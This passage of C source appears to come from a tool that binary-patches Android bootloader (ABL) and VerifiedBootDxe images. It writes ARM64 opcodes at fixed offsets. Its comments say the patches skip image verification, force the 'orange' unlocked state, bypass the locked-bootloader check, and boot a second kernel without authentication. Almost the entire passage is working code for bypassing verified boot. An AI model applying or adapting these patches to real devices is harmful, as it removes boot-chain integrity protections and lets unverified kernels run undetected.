        //OPCODE(vbcode + 0x2C98, 0x39, 0x00, 0x00, 0x14);           // b     #0xe4 = [ 39 00 00 14 ]          skip image verification in VerifiedBootDxe module with RED
}

static void p118_test7_patch(unsigned char *ablcode, int size, int offset)
{
        OPCODE(ablcode + 0x0B984, 0x2a, 0x00, 0x80, 0xd2);         // mov   x10, #0x01 = [ 2a 00 80 d2 ]     force "orange" in kernel command line
}

static void p118_test8_patch(unsigned char *ablcode, int size, int offset)
{
        OPCODE(ablcode + 0x31AE8 + 0x00, 0x94, 0x22, 0x00, 0x51);  // sub   w20, w20, #0x08 = [ 94 22 00 51 ]
        OPCODE(ablcode + 0x31AE8 + 0x04, 0x74, 0x6a, 0x74, 0xf8);  // ldr   x20, [x19, x20] = [ 74 6a 74 f8 ]    get the size of the first kernel image from the end of buffer
        OPCODE(ablcode + 0x31AE8 + 0x08, 0x16, 0x00, 0x00, 0x14);  // b     #0x58 = [ 16 00 00 14 ]              skip checking for unlocked bootloader and returning errors if locked
        OPCODE(ablcode + 0x31AE8 + 0x0c, 0x62, 0x02, 0x14, 0x8b);  // add   x2, x19, x20 = [ 62 02 14 8b ]
        OPCODE(ablcode + 0x31AE8 + 0x10, 0xe1, 0x03, 0x13, 0xaa);  // mov   x1, x19 = [ e1 03 13 aa ]
        OPCODE(ablcode + 0x31AE8 + 0x14, 0x54, 0x84, 0x40, 0xf8);  // ldr   x20, [x2], #0x08 = [ 54 84 40 f8 ]   get the size of the second kernel image

        //OPCODE(ablcode + 0x31AE8 + 0x18, 0xf4, 0x67, 0x00, 0xf9);  // str   x20, [sp, #0xc8] = [ f4 67 00 f9 ]   update the kernel image size to boot   !!TODO: verify if this is valid!! -> NOT PRESENT -> REMOVE?!
        OPCODE(ablcode + 0x31AE8 + 0x18, 0x1f, 0x20, 0x03, 0xd5);  // nop = [ 1f 20 03 d5 ]

        OPCODE(ablcode + 0x31AE8 + 0x1c, 0x63, 0x02, 0x14, 0x8b);  // add   x3, x19, x20 = [ 63 02 14 8b ]
        OPCODE(ablcode + 0x31AE8 + 0x20, 0x40, 0x84, 0x40, 0xf8);  // ldr   x0, [x2], #0x08 = [ 40 84 40 f8 ]
        OPCODE(ablcode + 0x31AE8 + 0x24, 0x20, 0x84, 0x00, 0xf8);  // str   x0, [x1], #0x08 = [ 20 84 00 f8 ]
        OPCODE(ablcode + 0x31AE8 + 0x28, 0x3f, 0x00, 0x03, 0xeb);  // cmp   x1, x3 = [ 3f 00 03 eb ]
        OPCODE(ablcode + 0x31AE8 + 0x2c, 0xa3, 0xff, 0xff, 0x54);  // b.lo  #-0x0c = [ a3 ff ff 54 ]
        OPCODE(ablcode + 0x31AE8 + 0x30, 0x7f, 0x00, 0x00, 0xf9);  // str   xzr, [x3] = [ 7f 00 00 f9 ]
        OPCODE(ablcode + 0x31AE8 + 0x34, 0x0b, 0x00, 0x00, 0x14);  // b     #0x2c = [ 0b 00 00 14 ]              jmp to check the second kernel moved to the place of 1st one
        OPCODE(ablcode + 0x31AE8 + 0x38, 0x61, 0x6a, 0x74, 0xf8);  // ldr   x1, [x19, x20] = [ 61 6a 74 f8 ]     check if we have size for the second kernel image there
        OPCODE(ablcode + 0x31AE8 + 0x3c, 0xe0, 0x63, 0x00, 0x91);  // add   x0, sp, #0x18 = [ e0 63 00 91 ]      orig instruction from 0x31C6C
        OPCODE(ablcode + 0x31AE8 + 0x40, 0x61, 0x0b, 0x00, 0xb4);  // cbz   x1, #0x16c = [ 61 0b 00 b4 ]         on second kernel skip image auth and go to boot it
        OPCODE(ablcode + 0x31AE8 + 0x44, 0x51, 0x00, 0x00, 0x14);  // b     #0x144 = [ 51 00 00 14 ]             continue with auth of the first kernel

        OPCODE(ablcode + 0x31C6C + 0x00, 0xad, 0xff, 0xff, 0x17);  // b     #-0x14c = [ ad ff ff 17 ]            hook before image auth to decide if to skip it
        OPCODE(ablcode + 0x31C78 + 0x00, 0xe9, 0xf3, 0xff, 0xb4);  // cbz   x9, #-0x184 = [ e9 f3 ff b4 ]        continue with patched code after the first image auth (0x31AE8 + 0x0c)
}

static void p118_test9_patch(unsigned char *vbcode, int size, int offset)
{
        OPCODE(vbcode + 0x02C30 + 0x00, 0xc2, 0x00, 0x00, 0x10);   // adr   x2, #0x18 = [ c2 00 00 10 ]
        OPCODE(vbcode + 0x02C30 + 0x04, 0x42, 0x00, 0x40, 0xb9);   // ldr   w2, [x2] = [ 42 00 40 b9 ]
        //OPCODE(vbcode + 0x02C30 + 0x08, 0x51, 0x00, 0x00, 0xd0); // adrp  x17, #0xa000
        //OPCODE(vbcode + 0x02C30 + 0x0c, 0x22, 0x62, 0x02, 0xb9); // str   w2, [x17, #0x260]
        OPCODE(vbcode + 0x02C30 + 0x10, 0x62, 0x2e, 0x00, 0xb9);   // str   w2, [x19, #0x2c] = [ 62 2e 00 b9 ]
        OPCODE(vbcode + 0x02C30 + 0x14, 0x05, 0x00, 0x00, 0x14);   // b     #0x14 = [ 05 00 00 14 ]
        *(uint32_t *)(vbcode + 0x02C30 + 0x18) = offset;
}
